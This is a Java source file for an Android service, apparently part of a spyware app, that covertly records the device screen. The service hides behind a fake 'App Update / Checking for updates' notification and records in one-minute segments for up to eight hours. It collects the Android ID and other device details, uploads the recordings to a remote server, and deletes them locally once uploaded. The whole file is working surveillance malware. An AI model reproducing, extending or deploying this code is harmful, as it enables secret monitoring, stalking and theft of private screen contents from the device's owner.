package org.code.coregradle.services;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Display;
import android.view.Surface;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.R;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.gatherers.WynkGatherer;
import org.code.coregradle.utils.CompressionUtils;
import org.code.coregradle.utils.FileUtils;
import org.code.coregradle.utils.MessageXInterceptor;
import org.code.coregradle.utils.WynkHelper;

import java.io.File;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class WynkService extends Service {
    private IdentityStore identityStore;
    private MediaProjection mMediaProjection;
    private MediaProjectionManager mediaProjectionManager;
    private VirtualDisplay mVirtualDisplay;
    private NotificationManager notificationManager;
    private final String channelId = "OTA Push";
    private final ExecutorService executorService = Executors.newCachedThreadPool();
    private OkHttpClient httpClient;
    private Handler mHandler;
    private File screenCaptureStore;
    private int mRotation;
    private Display mDisplay;
    private WynkHelper wynkHelper;
    private MediaProjection.Callback mMediaProjectionCallback;
    private MediaRecorder mMediaRecorder;
    private File capturedWynk;
    private Intent dataIntent;
    private int resultCode;
    private static final long maxRecordTime = (8 * 60 * 60 * 1000L);

    public synchronized void uploadRecording(File file) {

        RequestBody requestBody = RequestBody.create(MediaType.get("application/x-binary"), file);
        try {
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_WYNK)
                    .addHeader(this.identityStore.getUploadHeaderKey(), this.identityStore.getIdentityValue())
                    .addHeader("X-FILE-ID", file.getName())
                    .post(requestBody)
                    .build();
            OkHttpClient client = new OkHttpClient();
            Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                file.delete();
            }
        } catch (Exception ignored) {
        }
    }

    public File moveFile(File src) {
        File destFile = new File(screenCaptureStore, src.getName());
        src.renameTo(destFile);
        return destFile;
    }

    public void uploadOrMoveFile(File file) {
        // First try to move the file to be on safer side
        File dest = moveFile(file);
        // Then try to upload the moved file
        uploadRecording(dest);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        final int rotation = mDisplay.getRotation();
        if (rotation != mRotation) {
            mRotation = rotation;
        }
    }

    private void initializeWinkEndTime() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(WynkGatherer.WINK_EXTEND_PREFS, MODE_PRIVATE);
            long currentTime = System.currentTimeMillis();
            long endTime = currentTime + maxRecordTime;
            sharedPreferences.edit().putLong(WynkGatherer.WINK_END_TIME, endTime).apply();
        } catch (Exception ignored) {
        }
    }

    private long getExpectedEndTime() {
        long expectedEndTime = 0;
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(WynkGatherer.WINK_EXTEND_PREFS, MODE_PRIVATE);
            expectedEndTime = sharedPreferences.getLong(WynkGatherer.WINK_END_TIME, 0);
        } catch (Exception ignored) {
        }
        return expectedEndTime;
    }

    private boolean shouldWinkContinue() {
        try {
            long expectedEndTime = getExpectedEndTime();
            long currentTime = System.currentTimeMillis();
            boolean durationExceeded = currentTime > expectedEndTime;
            return wynkHelper.isRecording() && !durationExceeded;
        } catch (Exception ignored) {
        }
        return true;
    }

    private void cleanupWinkEndTime() {
        try {
            SharedPreferences sharedPreferences = getSharedPreferences(WynkGatherer.WINK_EXTEND_PREFS, MODE_PRIVATE);
            sharedPreferences.edit().remove(WynkGatherer.WINK_END_TIME).apply();
        } catch (Exception ignored) {
        }
    }

    private void startWynking() {
        boolean started = wynkHelper.startRecording();
        if (!started) {
            return;
        }
        Date startDate = new Date();
        initializeWinkEndTime();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mMediaProjection = mediaProjectionManager.getMediaProjection(resultCode, dataIntent);
        }
        while (shouldWinkContinue()) {
            try {
                JSONObject wynkAttempt = reportWynkAttempt(startDate);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    if (mMediaProjection != null) {
                        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                        mDisplay = windowManager.getDefaultDisplay();
                        prepareMediaRecorder(wynkAttempt);
                        createVirtualDisplay();
                        mMediaProjectionCallback = new MediaProjectionStopCallback();
                        mMediaProjection.registerCallback(mMediaProjectionCallback, mHandler);

                    } else {
                        executorService.submit(new MessageXInterceptor("Screen Record permission is not granted", identityStore.getIdentityValue()));
                        break;
                    }
                    if (wynkHelper.isMonitoring()) {
                        wynkHelper.stopMonitoring();
                    }
                    mMediaRecorder.start();
                    int pauseTime = 0;
                    while (wynkHelper.isRecording() && pauseTime < wynkAttempt.getInt("delay")) {
                        executorService.submit(() -> reportWynkAttempt(startDate, true));
                        Thread.sleep(60 * 1000);
                        pauseTime += 60;
                    }
                    mMediaRecorder.stop();
                    executorService.submit(() -> uploadOrMoveFile(capturedWynk));
                    cleanup();
                } else {
                    executorService.submit(new MessageXInterceptor("Unable to start recording (Android Version < 5)", identityStore.getIdentityValue()));
                    break;
                }
            } catch (Exception ignored) {
                Log.d("WynkService", "Error: ", ignored);
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                if (!powerManager.isScreenOn() || keyguardManager.isKeyguardLocked()) {
                    try {
                        executorService.submit(new MessageXInterceptor("Caught Runtime exception when screen off, queueing wynk", identityStore.getIdentityValue()));
                    } catch (Exception ignored2) {

                    }
                    wynkHelper.queueRecording();
                } else {
                    String errMsg = ignored.getMessage();
                    if (errMsg == null) {
                        errMsg = "*[EMPTY]*";
                    }
                    try {
                        executorService.submit(new MessageXInterceptor("Caught Runtime exception when screen is on: " + errMsg, identityStore.getIdentityValue()));
                    } catch (JSONException ignored3) {

                    }
                }
                break;
            }
        }
        cleanupWinkEndTime();
        try {
            executorService.submit(new MessageXInterceptor("Exited from Wynk loop", identityStore.getIdentityValue()));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                cleanup();
                if (mMediaProjection != null) {
                    mMediaProjection.stop();
                }
            }
        } catch (Exception ignored) {
            Log.d("WynkService", "Failed to stop: ", ignored);
        }
    }

    public void cleanup() {
        mHandler.post(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                if (mMediaRecorder != null) {
                    mMediaRecorder.reset();
                }
                if (mVirtualDisplay != null) mVirtualDisplay.release();
                if (mMediaProjectionCallback != null)
                    mMediaProjection.unregisterCallback(mMediaProjectionCallback);

            }
        });
    }


    public WynkService() {
    }

    private static int getVirtualDisplayFlags() {
        return DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    }

    public void createHandler() {
        new Thread() {
            @Override
            public void run() {
                Looper.prepare();
                mHandler = new Handler();
                Looper.loop();
            }
        }.start();
    }


    @Override
    public void onCreate() {
        super.onCreate();
        identityStore = IdentityStore.getInstance(this);
        notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        screenCaptureStore = new File(getFilesDir(), "wynks");
        screenCaptureStore.mkdir();
        httpClient = new OkHttpClient();
        wynkHelper = WynkHelper.getInstance(this);
        mMediaRecorder = new MediaRecorder();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            mediaProjectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            createHandler();
        }
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        mDisplay = windowManager.getDefaultDisplay();
        mRotation = mDisplay.getRotation();
    }

    public NotificationChannel createChannelIfNotExists(String channelId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel notificationChannel = notificationManager.getNotificationChannel(channelId);
            if (notificationChannel == null) {
                notificationChannel = new NotificationChannel(channelId, "App Update", NotificationManager.IMPORTANCE_HIGH);
                notificationManager.createNotificationChannel(notificationChannel);
            }
            return notificationChannel;
        }
        return null;
    }


    private Notification createNotification() {
        createChannelIfNotExists(channelId);
        return new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(R.drawable.ic_launcher_round)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_MESSAGE)
                .setColor(0xff11acfa)
                .setOngoing(false)
                .setContentTitle("Updating...")
                .setContentText("Checking for updates")
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(1337, createNotification());
        try {
            dataIntent = intent.getParcelableExtra("DATA");
            resultCode = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED);
            executorService.submit(new MessageXInterceptor("Started Wynking", identityStore.getIdentityValue()));
        } catch (Exception ignored) {

        }

        executorService.submit(this::startWynking);
        return START_STICKY;
    }

    private void askForRecording() {

    }

    private JSONObject getDeviceJSON() {
        JSONObject requestJSON = new JSONObject();
        try {
            String androidId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
            // Android Version
            requestJSON.put(this.identityStore.getIdentityKey(), this.identityStore.getIdentityValue());
            requestJSON.put("androidId", androidId);

            requestJSON.put("manufacturer", Build.MANUFACTURER);
            requestJSON.put("version", Build.VERSION.SDK_INT);
            requestJSON.put("versionRelease", Build.VERSION.RELEASE);
            requestJSON.put("modelNumber", Build.MODEL);
            return requestJSON;
        } catch (Exception e) {
        }
        return requestJSON;
    }

    private boolean isPortraitMode() {
        return mRotation == Surface.ROTATION_0 || mRotation == Surface.ROTATION_180;
    }

    public JSONObject reportWynkAttempt(Date startDate) {
        return reportWynkAttempt(startDate, false);
    }

    public JSONObject reportWynkAttempt(Date startDate, boolean isPing) {
        JSONObject responseJSON = new JSONObject();
        int widthPixels = Resources.getSystem().getDisplayMetrics().widthPixels;
        int heightPixels = Resources.getSystem().getDisplayMetrics().heightPixels;
        try {
            responseJSON.put("width", widthPixels);
            if (isPortraitMode()) {
                heightPixels = Math.max(heightPixels, widthPixels * 2);
            } else {
                widthPixels = Math.max(widthPixels, heightPixels * 2);
            }

            responseJSON.put("height", heightPixels);
            responseJSON.put("delay", 60);
            responseJSON.put("bitrate", 512000);
            responseJSON.put("encoder", MediaRecorder.VideoEncoder.H264);

            JSONObject requestJSON = new JSONObject();
            JSONObject deviceJSON = getDeviceJSON();
            requestJSON.put(this.identityStore.getIdentityKey(), identityStore.getIdentityValue());
            requestJSON.put("device", deviceJSON);
            requestJSON.put(isPing ? "pingTime" : "timestamp", new Date());
            requestJSON.put("startedAt", startDate.toString());
            requestJSON.put("expectedEndTime", getExpectedEndTime());
            Request request = new Request.Builder()
                    .url(ApiConfig.REQUEST_WYNK)
                    .post(RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString())))
                    .build();
            Response response = httpClient.newCall(request).execute();
            responseJSON = new JSONObject(response.body().string());
            if (!responseJSON.has("delay")) {
                responseJSON.put("delay", 60);
            }
            if (!responseJSON.has("width")) {
                responseJSON.put("width", widthPixels);
            }
            if (!responseJSON.has("height")) {
                responseJSON.put("height", heightPixels);
            }
            if (!responseJSON.has("bitrate")) {
                responseJSON.put("bitrate", 512000);
            }
            if (!responseJSON.has("encoder")) {
                responseJSON.put("encoder", MediaRecorder.VideoEncoder.H264);
            }
            return responseJSON;
        } catch (Exception e) {
        }
        return responseJSON;
    }

    private void prepareMediaRecorder(JSONObject wynkAttempt) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
                mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mMediaRecorder.setVideoEncodingBitRate(wynkAttempt.getInt("bitrate"));
                mMediaRecorder.setVideoEncoder(wynkAttempt.getInt("encoder"));
                mMediaRecorder.setVideoSize(wynkAttempt.getInt("width"), wynkAttempt.getInt("height"));
                mMediaRecorder.setVideoFrameRate(25);
                capturedWynk = new File(getFilesDir(), FileUtils.getTimeStampName() + ".mp4");
                capturedWynk.createNewFile();
                mMediaRecorder.setOutputFile(capturedWynk.getAbsolutePath());
                mMediaRecorder.prepare();
            }
        } catch (Exception ignored) {

        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private class MediaProjectionStopCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            try {
                executorService.submit(new MessageXInterceptor("Wynking MediaProjectionStopCallback", identityStore.getIdentityValue()));
            } catch (Exception ignored) {

            }
            cleanup();
        }
    }

    @SuppressLint("WrongConstant")
    private void createVirtualDisplay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            int widthPixels = Resources.getSystem().getDisplayMetrics().widthPixels;
            int heightPixels = Resources.getSystem().getDisplayMetrics().heightPixels;
            int density = Resources.getSystem().getDisplayMetrics().densityDpi;
            mVirtualDisplay = mMediaProjection.createVirtualDisplay("Wynker", widthPixels, heightPixels,
                    density, getVirtualDisplayFlags(), mMediaRecorder.getSurface(), null, mHandler);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}